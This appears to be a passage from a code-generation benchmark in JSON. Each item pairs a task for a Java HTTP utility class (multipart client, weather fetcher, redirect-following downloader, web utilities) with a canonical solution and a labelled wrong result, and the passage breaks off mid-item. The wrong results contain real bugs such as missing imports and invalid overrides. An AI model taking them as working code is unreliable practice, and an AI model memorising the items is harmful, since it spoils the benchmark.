[
  {
    "Task_id": 101,
    "Instruction": "Task Description: Create a Java HTTP client class that handles various types of HTTP requests, including multipart form data uploads, with support for proxy configuration and connection retries.\n\nClass Description: The HttpClient class provides functionality to make HTTP requests with configurable methods, headers, and request bodies. It supports both simple requests and multipart form data uploads, handles connection retries through a retry handler, and allows proxy configuration.\n\nAttributes:\n- url: String - The target URL for HTTP requests\n- con: HttpURLConnection - The HTTP connection object\n- os: OutputStream - Output stream for writing request data\n- delimiter: String - Boundary delimiter for multipart requests (default \"--\")\n- boundary: String - Unique boundary string for multipart requests\n- handler: HttpConnectionRetryHandler - Handler for connection retry logic\n- proxyHost: String - Proxy host address\n- proxyPort: String - Proxy port number\n- me: HttpClient - Singleton instance reference\n\nMethods:\n- getInstance() -> HttpClient - Returns the singleton instance of HttpClient\n- connect(String method, Properties props) -> void - Establishes HTTP connection with given method and properties (throws HttpClientException)\n- doConnection(String method, Properties props) -> void - Internal method to create and configure HTTP connection (throws IOException)\n- downloadImage(String imgName) -> byte[] - Downloads an image by name and returns as byte array\n- connectForMultipart() -> void - Prepares connection for multipart form data upload (throws Exception)\n- addFormPart(String paramName, String value) -> void - Adds a form part to multipart request (throws Exception)\n- addFilePart(String paramName, String fileName, byte[] data) -> void - Adds a file part to multipart request (throws Exception)\n- finishMultipart() -> void - Finalizes multipart request (throws Exception)\n- getResponse() -> String - Reads and returns server response (throws Exception)\n- writeParamData(String paramName, String value) -> void - Internal method to write form parameter data (throws Exception)\n- setUrl(String url) -> void - Sets the target URL\n- setProxy(String host, String port) -> void - Configures proxy settings",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.InetSocketAddress;\nimport java.net.Proxy;\nimport java.net.URL;\nimport java.util.Enumeration;\nimport java.util.Properties;\n\npublic class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    \n    private String delimiter = \"--\";\n    private String boundary =  \"SwA\"+Long.toString(System.currentTimeMillis())+\"SwA\";\n    \n    private HttpConnectionRetryHandler handler;\n    \n    private String proxyHost;\n    private String proxyPort;\n    \n    private static HttpClient me;\n    \n    public static HttpClient getInstance() {\n        if (me == null)\n            me = new HttpClient();\n        \n        return me;\n    }\n\n    private HttpClient() { }\n\n    public void connect(String method, Properties props) throws HttpClientException {\n        boolean status  = true;\n        int attemptNumber = 0;\n        while (status) {\n            try {\n                attemptNumber++;\n                doConnection(method, props);\n                status = false;\n            }\n            catch(Throwable t) {\n                if (handler != null) {\n                    status = handler.shouldRetry(t, attemptNumber);\n                    if (!status)\n                        throw new HttpClientException(t);\n                }\n                else {                    \n                    throw new HttpClientException(t);\n                }\n            }\n        }\n    }\n    \n    private void doConnection(String method, Properties props) throws IOException {\n        if (proxyPort != null && proxyHost != null) {\n            Proxy p = new Proxy(Proxy.Type.HTTP, new InetSocketAddress(proxyHost, Integer.parseInt(proxyPort)));\n            con = (HttpURLConnection) ( new URL(url)).openConnection(p);\n        }\n        else\n            con = (HttpURLConnection) ( new URL(url)).openConnection();\n        \n        con.setRequestMethod(method);\n        con.setDoInput(true);\n        con.setDoOutput(true);\n        con.setConnectTimeout(5 * 1000);\n        \n        if (props != null) {\n            Enumeration keys = props.keys();\n            while (keys.hasMoreElements()) {\n                String key = (String) keys.nextElement();\n                String val = props.getProperty(key);\n                con.setRequestProperty(key, val);\n            }\n        }\n        \n        con.connect();\n    }\n\n    public byte[] downloadImage(String imgName) {\n        ByteArrayOutputStream baos = new ByteArrayOutputStream();\n        try {\n            connect(\"Post\", null);\n            con.getOutputStream().write((\"name=\" + imgName).getBytes());\n            \n            InputStream is = con.getInputStream();\n            byte[] b = new byte[1024];\n            \n            while (is.read(b) != -1)\n                baos.write(b);\n            \n            con.disconnect();\n        }\n        catch(Throwable t) {\n            t.printStackTrace();\n        }\n        \n        return baos.toByteArray();\n    }\n\n    public void connectForMultipart() throws Exception {\n        Properties props = new Properties();\n        props.setProperty(\"Connection\", \"Keep-Alive\");\n        props.setProperty(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n\n        connect(\"POST\", props);\n        os = con.getOutputStream();\n    }\n\n    public void addFormPart(String paramName, String value) throws Exception {\n        writeParamData(paramName, value);\n    }\n\n    public void addFilePart(String paramName, String fileName, byte[] data) throws Exception {\n        os.write((delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\").getBytes());\n        os.write((\"Content-Type: application/octet-stream\\r\\n\").getBytes());\n        os.write((\"Content-Transfer-Encoding: binary\\r\\n\").getBytes());\n        os.write(\"\\r\\n\".getBytes());\n   \n        os.write(data);\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void finishMultipart() throws Exception {\n        os.write((delimiter + boundary + delimiter + \"\\r\\n\").getBytes());\n    }\n\n    public String getResponse() throws Exception {\n        InputStream is = con.getInputStream();\n        byte[] b1 = new byte[1024];\n        StringBuffer buffer = new StringBuffer();\n        \n        while (is.read(b1) != -1)\n            buffer.append(new String(b1));\n        \n        con.disconnect();\n        \n        return buffer.toString();\n    }\n\n    private void writeParamData(String paramName, String value) throws Exception {\n        os.write((delimiter + boundary + \"\\r\\n\").getBytes());\n        os.write(\"Content-Type: text/plain\\r\\n\".getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\").getBytes());\n        os.write((\"\\r\\n\" + value + \"\\r\\n\").getBytes());\n    }\n\n    public void setUrl(String url) {\n        this.url = url;\n    }\n    \n    public void setProxy(String host, String port) {\n        this.proxyHost = host;\n        this.proxyPort = port;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.util.Properties;\nimport java.util.concurrent.atomic.AtomicInteger;\n\npublic class HttpClient {\n    private String url;\n    private HttpURLConnection con;\n    private OutputStream os;\n    private static final String DELIMITER = \"--\";\n    private String boundary = System.currentTimeMillis() + \"===\";\n    private HttpConnectionRetryHandler handler;\n    private String proxyHost;\n    private String proxyPort;\n    private static HttpClient me = new HttpClient();\n\n    public static HttpClient getInstance() {\n        return me;\n    }\n\n    public void connect(String method, Properties props) throws HttpClientException {\n        int retryCount = 0;\n        while (retryCount <= handler.getMaxRetries()) {\n            try {\n                doConnection(method, props);\n                break;\n            } catch (IOException e) {\n                if (retryCount < handler.getMaxRetries()) {\n                    retryCount++;\n                    try {\n                        Thread.sleep(handler.getRetryInterval());\n                    } catch (InterruptedException ie) {\n                        Thread.currentThread().interrupt();\n                    }\n                } else {\n                    throw new HttpClientException(\"Failed after \" + handler.getMaxRetries() + \" retries\", e);\n                }\n            }\n        }\n    }\n\n    private void doConnection(String method, Properties props) throws IOException {\n        URL obj = new URL(url);\n        Proxy proxy = null;\n        if (proxyHost != null && !proxyHost.isEmpty()) {\n            InetSocketAddress addr = new InetSocketAddress(proxyHost, Integer.parseInt(proxyPort));\n            proxy = new Proxy(Proxy.Type.HTTP, addr);\n        }\n        con = (HttpURLConnection) (proxy != null ? obj.openConnection(proxy) : obj.openConnection());\n        con.setRequestMethod(method);\n        con.setDoOutput(true);\n\n        for (Object key : props.keySet()) {\n            con.setRequestProperty((String) key, props.getProperty((String) key));\n        }\n    }\n\n    public byte[] downloadImage(String imgName) throws Exception {\n        Properties props = new Properties();\n        props.put(\"Accept\", \"image/*\");\n        connect(\"GET\", props);\n        InputStream is = con.getInputStream();\n        ByteArrayOutputStream buffer = new ByteArrayOutputStream();\n        int nRead;\n        byte[] data = new byte[16384];\n        while ((nRead = is.read(data, 0, data.length)) != -1) {\n            buffer.write(data, 0, nRead);\n        }\n        buffer.flush();\n        return buffer.toByteArray();\n    }\n\n    public void connectForMultipart() throws Exception {\n        Properties props = new Properties();\n        props.put(\"Content-Type\", \"multipart/form-data; boundary=\" + boundary);\n        connect(\"POST\", props);\n        os = con.getOutputStream();\n    }\n\n    public void addFormPart(String paramName, String value) throws Exception {\n        writeParamData(paramName, value);\n    }\n\n    public void addFilePart(String paramName, String fileName, byte[] data) throws Exception {\n        writeDelimiter(paramName);\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"; filename=\\\"\" + fileName + \"\\\"\\r\\n\").getBytes());\n        os.write(\"Content-Type: application/octet-stream\\r\\n\\r\\n\".getBytes());\n        os.write(data);\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    public void finishMultipart() throws Exception {\n        writeDelimiter(\"\");\n        os.write(DELIMITER.getBytes());\n        os.flush();\n        os.close();\n    }\n\n    public String getResponse() throws Exception {\n        BufferedReader in = new BufferedReader(new InputStreamReader(con.getInputStream()));\n        String inputLine;\n        StringBuilder response = new StringBuilder();\n        while ((inputLine = in.readLine()) != null) {\n            response.append(inputLine);\n        }\n        in.close();\n        return response.toString();\n    }\n\n    private void writeParamData(String paramName, String value) throws Exception {\n        writeDelimiter(paramName);\n        os.write((\"Content-Type: text/plain; charset=UTF-8\\r\\n\\r\\n\").getBytes());\n        os.write(value.getBytes(\"UTF-8\"));\n        os.write(\"\\r\\n\".getBytes());\n    }\n\n    private void writeDelimiter(String paramName) throws IOException {\n        os.write((DELIMITER + boundary + \"\\r\\n\").getBytes());\n        os.write((\"Content-Disposition: form-data; name=\\\"\" + paramName + \"\\\"\\r\\n\").getBytes());\n    }\n\n    public void setUrl(String url) {\n        this.url = url;\n    }\n\n    public void setProxy(String host, String port) {\n        this.proxyHost = host;\n        this.proxyPort = port;\n    }\n\n    public static class HttpConnectionRetryHandler {\n        private int maxRetries;\n        private int retryInterval;\n\n        public HttpConnectionRetryHandler(int maxRetries, int retryInterval) {\n            this.maxRetries = maxRetries;\n            this.retryInterval = retryInterval;\n        }\n\n        public int getMaxRetries() {\n            return maxRetries;\n        }\n\n        public int getRetryInterval() {\n            return retryInterval;\n        }\n    }\n\n    public static class HttpClientException extends Exception {\n        public HttpClientException(String message, Throwable cause) {\n            super(message, cause);\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 103,
    "Instruction": "Task Description: Create a Java class that asynchronously fetches weather data from a remote API using HTTP URL connection and processes the JSON response to extract sunrise and sunset times.\n\nClass Description: HttpWeatherClient is an Android utility class that performs asynchronous HTTP requests to fetch weather data and parse the JSON response. It uses AsyncTask to handle network operations off the main thread.\n\nAttributes: None (All variables are local to methods)\n\nMethods:\n1: WeatherAsyncTask(String... params) -> String - AsyncTask subclass that handles the background HTTP request. Takes URL string as input and returns null (results are processed via progress updates).\n2: onProgressUpdate(String... progress) -> void - Processes the JSON response to extract sunrise and sunset times from the astronomy data.\n3: convertStreamToString(InputStream inputStream) -> String - Helper method that converts an InputStream to a String for JSON parsing. Takes InputStream as input and returns the converted String.\n\nNote: All methods include basic exception handling with empty catch blocks as shown in the reference code. The class is designed for Android platform (uses android.os.AsyncTask).",
    "Canonical_solution": "import android.os.AsyncTask;\nimport org.json.JSONObject;\nimport java.io.BufferedInputStream;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpWeatherClient {\n\n    public static class WeatherAsyncTask extends AsyncTask<String, String, String> {\n        @Override\n        protected String doInBackground(String... params) {\n            try {\n                String weatherData;\n                URL url = new URL(params[0]);\n                HttpURLConnection urlConnection = (HttpURLConnection) url.openConnection();\n                urlConnection.setConnectTimeout(7000);\n\n                try {\n                    InputStream in = new BufferedInputStream(urlConnection.getInputStream());\n                    weatherData = convertStreamToString(in);\n                    publishProgress(weatherData);\n                } finally {\n                    urlConnection.disconnect();\n                }\n            } catch (Exception ex) {}\n            return null;\n        }\n\n        protected void onProgressUpdate(String... progress) {\n            try {\n                JSONObject json = new JSONObject(progress[0]);\n                JSONObject query = json.getJSONObject(\"query\");\n                JSONObject results = query.getJSONObject(\"results\");\n                JSONObject channel = results.getJSONObject(\"channel\");\n                JSONObject astronomy = channel.getJSONObject(\"astronomy\");\n                String sunset = astronomy.getString(\"sunset\");\n                String sunrise = astronomy.getString(\"sunrise\");\n            } catch (Exception ex) {}\n        }\n    }\n\n    private static String convertStreamToString(InputStream inputStream) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        String result = \"\";\n\n        try {\n            while ((line = reader.readLine()) != null) {\n                result += line;\n            }\n            inputStream.close();\n        } catch (Exception ex) {}\n\n        return result;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport android.os.AsyncTask;\nimport android.os.Bundle;\nimport org.json.JSONObject;\nimport java.io.BufferedReader;\nimport java.io.InputStream;\nimport java.io.InputStreamReader;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\npublic class HttpWeatherClient extends AsyncTask<String, String, String> {\n\n    @Override\n    protected String WeatherAsyncTask(String... params) {\n        try {\n            URL url = new URL(params[0]);\n            HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n            connection.setRequestMethod(\"GET\");\n            InputStream inputStream = connection.getInputStream();\n            String response = convertStreamToString(inputStream);\n            publishProgress(response);\n        } catch (Exception e) {\n        }\n        return null;\n    }\n\n    @Override\n    protected void onProgressUpdate(String... progress) {\n        super.onProgressUpdate(progress);\n        try {\n            JSONObject json = new JSONObject(progress[0]);\n            JSONObject astronomy = json.getJSONObject(\"astronomy\");\n            JSONObject sunrise = astronomy.getJSONObject(\"sunrise\");\n            JSONObject sunset = astronomy.getJSONObject(\"sunset\");\n            String sunriseTime = sunrise.getString(\"hour\") + \":\" + sunrise.getString(\"minute\");\n            String sunsetTime = sunset.getString(\"hour\") + \":\" + sunset.getString(\"minute\");\n        } catch (Exception e) {\n        }\n    }\n\n    private String convertStreamToString(InputStream inputStream) {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        StringBuilder sb = new StringBuilder();\n        String line;\n        try {\n            while ((line = reader.readLine()) != null) {\n                sb.append(line).append(\"\\n\");\n            }\n        } catch (Exception e) {\n        } finally {\n            try {\n                inputStream.close();\n            } catch (Exception e) {\n            }\n        }\n        return sb.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 107,
    "Instruction": "Task Description: Implement a Java class that handles HTTP downloads with support for redirects and user-agent customization.\n\nClass Description: The HttpDownloader class provides functionality to download files from HTTP URLs while handling redirects (up to a maximum limit) and allowing customization of the User-Agent header. It includes logging capabilities for tracking download progress and errors.\n\nAttributes:\n- logger: Logger - SLF4J logger for tracking download operations and errors\n- MAXIMUM_REDIRECTS: int - Maximum number of redirects to follow (constant value 8)\n\nMethods:\n- download(String targetUrlString, Path path, String userAgent) -> void - Main method to initiate download from a URL to a specified path with a custom user agent. Throws IOException for network or file operation failures.\n- getDownloadedOrNextUrl(String urlString, Path path, String userAgent) -> Optional<String> - Helper method that processes a single URL request, either downloading the content or returning the next URL in case of redirect. Throws IOException for network or file operation failures. Returns Optional.empty() if download was successful, or Optional containing the next URL if redirect occurred.",
    "Canonical_solution": "import java.io.ByteArrayOutputStream;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.MalformedURLException;\nimport java.net.URL;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.nio.file.StandardCopyOption;\nimport java.util.Optional;\nimport org.slf4j.Logger;\nimport org.slf4j.LoggerFactory;\n\nclass HttpDownloader {\n    private static final Logger logger = LoggerFactory.getLogger(HttpDownloader.class);\n    private static final int MAXIMUM_REDIRECTS = 8;\n\n    public static void download(final String targetUrlString, final Path path, final String userAgent) throws IOException {\n        logger.info(\"Started download from: \" + targetUrlString);\n\n        String urlString = targetUrlString;\n        for (int i = 0; i < MAXIMUM_REDIRECTS; ++i) {\n            final Optional<String> nextUrlString = getDownloadedOrNextUrl(urlString, path, userAgent);\n            if (!nextUrlString.isPresent()) {\n                return;\n            }\n            logger.info(\"Redirected to: \" + nextUrlString.get());\n            urlString = nextUrlString.get();\n        }\n        throw new IOException(\"Too many redirects from: \" + targetUrlString);\n    }\n\n    private static Optional<String> getDownloadedOrNextUrl(final String urlString, final Path path, final String userAgent)\n            throws IOException {\n        logger.debug(\"Requesting GET {}\", urlString);\n        final URL url;\n        try {\n            url = new URL(urlString);\n        } catch (final MalformedURLException ex) {\n            throw new IOException(\"Invalid URL: \" + urlString, ex);\n        }\n\n        final HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        try {\n            connection.setInstanceFollowRedirects(false);\n            connection.setRequestMethod(\"GET\");\n            connection.setRequestProperty(\"Accept\", \"*/*\");\n            connection.setRequestProperty(\"User-Agent\", userAgent);\n            connection.connect();\n\n            final int statusCode = connection.getResponseCode();\n            logger.debug(\"Received HTTP status code {} from GET {}\", statusCode, urlString);\n            switch (statusCode) {\n                case HttpURLConnection.HTTP_MOVED_PERM:\n                case HttpURLConnection.HTTP_MOVED_TEMP:\n                    final String location = connection.getHeaderField(\"Location\");\n                    if (location == null) {\n                        throw new IOException(\"No Location header for HTTP status code \" + statusCode);\n                    }\n                    return Optional.of(location);\n                case HttpURLConnection.HTTP_OK:\n                    final InputStream downloadStream = connection.getInputStream();\n                    logger.info(\"Downloading from {} into {}\", urlString, path.toString());\n                    Files.copy(downloadStream, path, StandardCopyOption.REPLACE_EXISTING);\n                    logger.info(\"Downloaded\");\n                    return Optional.empty();\n                default:\n                    final String responseMessage;\n                    try {\n                        responseMessage = connection.getResponseMessage();\n                    } catch (final IOException ex) {\n                        throw new IOException(\"Unexpected HTTP status code \" + statusCode, ex);\n                    }\n                    throw new IOException(\"Unexpected HTTP status code \" + statusCode + \" with message: \" + responseMessage);\n            }\n        } finally {\n            connection.disconnect();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.nio.file.*;\nimport java.util.Optional;\nimport org.slf4j.Logger;\n\npublic class HttpDownloader {\n    private final Logger logger;\n    private static final int MAXIMUM_REDIRECTS = 8;\n\n    public HttpDownloader(Logger logger) {\n        this.logger = logger;\n    }\n\n    public void download(String targetUrlString, Path path, String userAgent) throws IOException {\n        URL url = new URL(targetUrlString);\n        try (OutputStream os = Files.newOutputStream(path)) {\n            downloadResource(url, os, userAgent, 0);\n        }\n    }\n\n    private void downloadResource(URL url, OutputStream outputStream, String userAgent, int redirectCount) throws IOException {\n        HttpURLConnection connection = openConnectionWithUserAgent(url, userAgent);\n\n        int responseCode = connection.getResponseCode();\n        if (responseCode >= 300 && responseCode < 400 && redirectCount < MAXIMUM_REDIRECTS) {\n            String location = connection.getHeaderField(\"Location\");\n            if (location == null || location.isEmpty()) {\n                throw new IOException(\"Received redirect status code but no 'Location' header was provided.\");\n            }\n\n            logger.info(\"Redirecting from {} to {}\", url, location);\n            URL nextUrl = new URL(location);\n            downloadResource(nextUrl, outputStream, userAgent, redirectCount + 1);\n        } else if (responseCode == HttpURLConnection.HTTP_OK) {\n            try (InputStream is = connection.getInputStream()) {\n                byte[] buffer = new byte[8192];\n                int bytesRead;\n                while ((bytesRead = is.read(buffer)) != -1) {\n                    outputStream.write(buffer, 0, bytesRead);\n                }\n            }\n        } else {\n            throw new IOException(\"Unexpected HTTP response code: \" + responseCode);\n        }\n    }\n\n    private HttpURLConnection openConnectionWithUserAgent(URL url, String userAgent) throws IOException {\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setInstanceFollowRedirects(false);\n        connection.setRequestProperty(\"User-Agent\", userAgent);\n        connection.connect();\n        return connection;\n    }\n\n    public Optional<String> getDownloadedOrNextUrl(String urlString, Path path, String userAgent) throws IOException {\n        URL url = new URL(urlString);\n        HttpURLConnection connection = openConnectionWithUserAgent(url, userAgent);\n        int responseCode = connection.getResponseCode();\n\n        if (responseCode >= 300 && responseCode < 400) {\n            String location = connection.getHeaderField(\"Location\");\n            if (location != null && !location.isEmpty()) {\n                return Optional.of(location);\n            }\n        } else if (responseCode == HttpURLConnection.HTTP_OK) {\n            try (OutputStream os = Files.newOutputStream(path);\n                 InputStream is = connection.getInputStream()) {\n                byte[] buffer = new byte[8192];\n                int bytesRead;\n                while ((bytesRead = is.read(buffer)) != -1) {\n                    os.write(buffer, 0, bytesRead);\n                }\n            }\n            return Optional.empty();\n        } else {\n            throw new IOException(\"Unexpected HTTP response code: \" + responseCode);\n        }\n\n        return Optional.empty();\n    }\n}\n```"
  },
  {
    "Task_id": 108,
    "Instruction": "Task Description: Create a utility class for handling various HTTP operations including GET, POST requests, file downloads, and form submissions.\n\nClass Description: WebUtils is a utility class that provides static methods for performing common HTTP operations. It handles connection management, request configuration, and response processing.\n\nMethods:\n\nMethod1: getBody(String reqURL) -> String - Performs a GET request to the specified URL and returns the response body as a string.\nMethod2: getJson(String reqURL) -> JsonNode - Performs a GET request to the specified URL and parses the JSON response into a JsonNode object.\nMethod3: downloadFile(String reqURL, String fileLocation) -> void - Downloads a file from the specified URL and saves it to the given file location.\nMethod4: post(String reqURL, String postContent) -> String - Performs a POST request with plain text content to the specified URL and returns the response body.\nMethod5: postForm(String reqURL, Map<String, String> fields) -> String - Performs a form submission (application/x-www-form-urlencoded) to the specified URL with the given form fields and returns the response body.\nMethod6: getLineStream(String reqURL) -> Stream<String> - Performs a GET request to the specified URL and returns the response as a stream of lines.\nMethod7: getUserAgent() -> String - Returns a formatted User-Agent string for HTTP requests.\nMethod8: connectionToString(HttpURLConnection con) -> String - Helper method that reads the response from an HttpURLConnection and converts it to a string.",
    "Canonical_solution": "import com.fasterxml.jackson.databind.JsonNode;\nimport org.geysermc.geyser.GeyserImpl;\n\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.net.URLEncoder;\nimport java.nio.charset.StandardCharsets;\nimport java.nio.file.Files;\nimport java.nio.file.Paths;\nimport java.nio.file.StandardCopyOption;\nimport java.util.Map;\nimport java.util.stream.Stream;\n\npublic class WebUtils {\n\n    public static String getBody(String reqURL) {\n        try {\n            URL url = new URL(reqURL);\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"GET\");\n            con.setRequestProperty(\"User-Agent\", getUserAgent());\n            con.setConnectTimeout(10000);\n            con.setReadTimeout(10000);\n\n            return connectionToString(con);\n        } catch (Exception e) {\n            return e.getMessage();\n        }\n    }\n\n    public static JsonNode getJson(String reqURL) throws IOException {\n        HttpURLConnection con = (HttpURLConnection) new URL(reqURL).openConnection();\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setConnectTimeout(10000);\n        con.setReadTimeout(10000);\n        return GeyserImpl.JSON_MAPPER.readTree(con.getInputStream());\n    }\n\n    public static void downloadFile(String reqURL, String fileLocation) {\n        try {\n            HttpURLConnection con = (HttpURLConnection) new URL(reqURL).openConnection();\n            con.setRequestProperty(\"User-Agent\", getUserAgent());\n            InputStream in = con.getInputStream();\n            Files.copy(in, Paths.get(fileLocation), StandardCopyOption.REPLACE_EXISTING);\n        } catch (Exception e) {\n            throw new RuntimeException(\"Unable to download and save file: \" + fileLocation + \" (\" + reqURL + \")\", e);\n        }\n    }\n\n    public static String post(String reqURL, String postContent) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"Content-Type\", \"text/plain\");\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setDoOutput(true);\n\n        OutputStream out = con.getOutputStream();\n        out.write(postContent.getBytes(StandardCharsets.UTF_8));\n        out.close();\n\n        return connectionToString(con);\n    }\n\n    private static String connectionToString(HttpURLConnection con) throws IOException {\n        con.getResponseCode();\n\n        InputStream inputStream = con.getErrorStream();\n        if (inputStream == null) {\n            inputStream = con.getInputStream();\n        }\n\n        StringBuilder content = new StringBuilder();\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(inputStream))) {\n            String inputLine;\n\n            while ((inputLine = in.readLine()) != null) {\n                content.append(inputLine);\n                content.append(\"\\n\");\n            }\n\n            con.disconnect();\n        }\n\n        return content.toString();\n    }\n\n    public static String postForm(String reqURL, Map<String, String> fields) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setDoOutput(true);\n\n        try (OutputStream out = con.getOutputStream()) {\n            for (Map.Entry<String, String> field : fields.entrySet()) {\n                out.write((field.getKey() + \"=\" + URLEncoder.encode(field.getValue(), StandardCharsets.UTF_8) + \"&\").getBytes(StandardCharsets.UTF_8));\n            }\n        }\n\n        return connectionToString(con);\n    }\n\n    public static Stream<String> getLineStream(String reqURL) {\n        try {\n            URL url = new URL(reqURL);\n            HttpURLConnection con = (HttpURLConnection) url.openConnection();\n            con.setRequestMethod(\"GET\");\n            con.setRequestProperty(\"User-Agent\", getUserAgent());\n            con.setConnectTimeout(10000);\n            con.setReadTimeout(10000);\n\n            return connectionToString(con).lines();\n        } catch (Exception e) {\n            GeyserImpl.getInstance().getLogger().error(\"Error while trying to get a stream from \" + reqURL, e);\n            return Stream.empty();\n        }\n    }\n\n    public static String getUserAgent() {\n        return \"Geyser-\" + GeyserImpl.getInstance().getPlatformType().platformName() + \"/\" + GeyserImpl.VERSION;\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.Map;\nimport java.util.Scanner;\nimport java.util.stream.Stream;\nimport com.fasterxml.jackson.databind.JsonNode;\nimport com.fasterxml.jackson.databind.ObjectMapper;\n\npublic class WebUtils {\n    private static final String USER_AGENT = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36\";\n\n    public static String getBody(String reqURL) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"GET\");\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        return connectionToString(con);\n    }\n\n    public static JsonNode getJson(String reqURL) throws IOException {\n        ObjectMapper mapper = new ObjectMapper();\n        return mapper.readTree(getBody(reqURL));\n    }\n\n    public static void downloadFile(String reqURL, String fileLocation) throws IOException {\n        try (InputStream in = new URL(reqURL).openStream()) {\n            Files.copy(in, Paths.get(fileLocation), StandardCopyOption.REPLACE_EXISTING);\n        }\n    }\n\n    public static String post(String reqURL, String postContent) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setRequestProperty(\"Content-Type\", \"text/plain\");\n        con.setDoOutput(true);\n\n        try (OutputStream os = con.getOutputStream()) {\n            byte[] input = postContent.getBytes(\"utf-8\");\n            os.write(input, 0, input.length);\n        }\n\n        return connectionToString(con);\n    }\n\n    public static String postForm(String reqURL, Map<String, String> fields) throws IOException {\n        StringBuilder data = new StringBuilder();\n        for (Map.Entry<String, String> entry : fields.entrySet()) {\n            if (data.length() > 0)\n                data.append('&');\n            data.append(URLEncoder.encode(entry.getKey(), \"UTF-8\"));\n            data.append('=');\n            data.append(URLEncoder.encode(entry.getValue(), \"UTF-8\"));\n        }\n\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"POST\");\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n        con.setRequestProperty(\"Content-Type\", \"application/x-www-form-urlencoded\");\n        con.setDoOutput(true);\n\n        try (OutputStream os = con.getOutputStream()) {\n            byte[] input = data.toString().getBytes(\"utf-8\");\n            os.write(input, 0, input.length);\n        }\n\n        return connectionToString(con);\n    }\n\n    public static Stream<String> getLineStream(String reqURL) throws IOException {\n        URL url = new URL(reqURL);\n        HttpURLConnection con = (HttpURLConnection) url.openConnection();\n        con.setRequestMethod(\"GET\");\n        con.setRequestProperty(\"User-Agent\", getUserAgent());\n\n        return new Scanner(con.getInputStream()).useDelimiter(\"\\\\A\").tokens();\n    }\n\n    public static String getUserAgent() {\n        return USER_AGENT;\n    }\n\n    private static String connectionToString(HttpURLConnection con) throws IOException {\n        BufferedReader reader = new BufferedReader(new InputStreamReader(con.getInputStream()));\n        StringBuilder response = new StringBuilder();\n        String line;\n\n        while ((line = reader.readLine()) != null) {\n            response.append(line);\n        }\n        reader.close();\n        return response.toString();\n    }\n}\n```"
  },
  {
    "Task_id": 109,
    "Instruction": "Task Description: Create a Java class that handles HTTP requests using HttpURLConnection, supporting both GET and POST methods with configurable timeouts and headers.\n\nClass Description: The RealRequest class provides functionality to make HTTP GET and POST requests with configurable connection settings. It handles request creation, header management, response processing, and error handling.\n\nAttributes:\n- sRequestURL: String - Static field storing the last requested URL\n- httpConfig: HttpConfig - Configuration object for connection settings (timeouts, etc.)\n- TAG: String - Constant for logging purposes (value: \"SA.HttpRequest\")\n\nMethods:\n- getData(String requestURL, Map<String, String> headerMap) -> RealResponse - Performs a GET request to the specified URL with optional headers\n- postData(String requestURL, String body, String bodyType, Map<String, String> headerMap) -> RealResponse - Performs a POST request with request body, content type, and optional headers\n- getHttpURLConnection(String requestURL, String requestMethod) -> HttpURLConnection - Creates and configures an HttpURLConnection instance\n- setHeader(HttpURLConnection conn, Map<String, String> headerMap) -> void - Applies headers to the connection\n- getRealResponse(HttpURLConnection conn) -> RealResponse - Processes the HTTP response into 